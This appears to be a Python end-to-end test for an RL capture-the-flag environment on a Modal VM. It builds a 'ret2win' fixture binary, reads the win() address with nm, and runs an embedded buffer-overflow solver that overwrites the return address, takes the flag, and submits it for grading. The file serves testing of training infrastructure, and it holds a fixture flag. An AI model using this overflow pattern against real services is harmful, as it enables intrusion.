"""Real-VM E2E for the packaged RLF CTF lease (W4 code path, no GPU).

acquire -> dockerd/build/target/health on a real Modal VM -> solver exploit
through the relay exec surface -> submit -> trusted grade -> teardown.
Flag stays trusted-side; the log only records whether grading passed.
"""
import asyncio, json, re, shlex, sys, time

sys.path.insert(0, '/home/michael/work/s19-verl64b-run')
from yeto.rl.rlf.modal import RlfModalProvider, RlfModalVmConfig, RlfCtfConfig

TASK_ID = 'fixture-ctf-ret2win'
FLAG = 'flag{rlf_vm_e2e_20261011a}'
TASKS_DIR = '/home/michael/work/s19-verl64b-run/evidence/rlf/tasks'

SOLVER = r'''
import os, socket, struct, sys
win = int(os.environ['WIN'], 16)
s = socket.create_connection(('127.0.0.1', 31337), timeout=10)
s.settimeout(5)
buf = b''
while b'name:' not in buf:
    c = s.recv(4096)
    if not c: break
    buf += c
s.sendall(b'A'*72 + struct.pack('<Q', win) + b'\n')
out = b''
try:
    while True:
        c = s.recv(4096)
        if not c: break
        out += c
except socket.timeout:
    pass
m = __import__('re').search(rb'flag\{[^}]*\}', out)
print('SOLVER_FLAG:' + (m.group(0).decode() if m else 'MISSING'))
'''

async def main():
    t0 = time.time()
    provider = RlfModalProvider(
        config=RlfModalVmConfig(ttl_s=900),
        ctf=RlfCtfConfig(tasks_dir=TASKS_DIR, flags={TASK_ID: FLAG}, lease_seconds=600))
    lease = await provider.acquire(TASK_ID)
    log = {'task_id': TASK_ID, 'episode_id': lease.episode_id,
           'trajectory_id': lease.trajectory_id, 'vm': lease.vm_lease.object_id,
           'env_url_set': bool(lease.env_url), 'token_len': len(lease.env_token)}
    env = lease.environment
    try:
        # 1. win address from the build stage (same trick as recvfix2)
        r = await env.execute(lease.episode_id,
            "docker -H unix:///run/docker/docker.sock build --network host --target build -t rlf-ctf-build /opt/task >/dev/null 2>&1 "
            "&& docker -H unix:///run/docker/docker.sock run --rm --entrypoint sh rlf-ctf-build -c \"nm -n /tmp/build/challenge | grep ' win\\$' | awk '{print \\$1}'\"",
            timeout_seconds=300, output_bytes=8192)
        log['win_query_rc'] = r['exit_code']
        win = r['output'].strip().splitlines()[-1].strip()
        log['win_addr'] = win
        # 2. exploit through the relay (agent-visible surface)
        cmd = ("docker -H unix:///run/docker/docker.sock run --rm --network host -e WIN=0x" + win.lstrip('0').lstrip('x')
               + " python:3.12-slim python -c " + shlex.quote(SOLVER))
        r = await env.execute(lease.episode_id, cmd, timeout_seconds=180, output_bytes=8192)
        log['solver_rc'] = r['exit_code']
        log['solver_timed_out'] = r['timed_out']
        log['solver_output'] = r['output']
        m = re.search(r'SOLVER_FLAG:(flag\{[^}]*\})', r['output'])
        if not m:
            log['error_class'] = 'solver_no_flag'
        else:
            await env.submit(lease.episode_id, {'flag': m.group(1)})
            ev = await lease.verifier.evaluate(lease.episode_id)
            log['evaluation_passed'] = ev['passed']
            log['rlf_grade'] = ev.get('rlf_grade')
        log['elapsed_s'] = round(time.time() - t0)
    finally:
        await lease.destroy()
        log['describe_after_destroy'] = await lease.describe()
    print('E2E_JSON:' + json.dumps(log))

asyncio.run(main())
